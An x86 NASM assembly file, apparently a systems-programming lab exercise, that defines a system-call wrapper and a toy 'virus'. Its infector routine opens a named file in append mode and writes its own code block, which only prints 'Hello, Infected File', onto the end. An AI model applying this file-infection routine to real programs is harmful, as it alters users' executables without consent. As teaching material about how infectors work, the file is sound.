section .data
    virus_msg db 'Hello, Infected File', 10, 0
    virus_len equ $ - virus_msg

section .text
global _start
global system_call
global infection
global infector
global code_start
global code_end
extern main
extern strlen

_start:
    pop    dword ecx
    mov    esi, esp
    mov    eax, ecx
    shl    eax, 2
    add    eax, esi
    add    eax, 4
    push   dword eax
    push   dword esi
    push   dword ecx
    call   main
    mov    ebx, eax
    mov    eax, 1
    int    0x80

system_call:
    push   ebp
    mov    ebp, esp
    sub    esp, 4
    pushad
    mov    eax, [ebp+8]
    mov    ebx, [ebp+12]
    mov    ecx, [ebp+16]
    mov    edx, [ebp+20]
    int    0x80
    mov    [ebp-4], eax
    popad
    mov    eax, [ebp-4]
    add    esp, 4
    pop    ebp
    ret

code_start:
    ; The virus code that gets written to files
    push   ebp
    mov    ebp, esp
    mov    eax, 4          ; sys_write
    mov    ebx, 1          ; stdout
    mov    ecx, virus_msg
    mov    edx, virus_len
    int    0x80
    mov    esp, ebp
    pop    ebp
    ret

infection:
    call   code_start
    ret

infector:
    push   ebp
    mov    ebp, esp
    ; Open file for appending
    mov    eax, 5          ; sys_open
    mov    ebx, [ebp+8]    ; filename
    mov    ecx, 2101o      ; O_WRONLY | O_APPEND
    mov    edx, 0777o      ; permissions
    int    0x80
    test   eax, eax        ; check if open succeeded
    js     .done           ; jump if sign flag set (negative result)
    
    ; Write virus code
    mov    ebx, eax        ; fd
    mov    eax, 4          ; sys_write
    mov    ecx, code_start
    mov    edx, code_end - code_start
    int    0x80
    
    ; Close file
    mov    eax, 6          ; sys_close
    int    0x80

.done:
    mov    esp, ebp
    pop    ebp
    ret

code_end: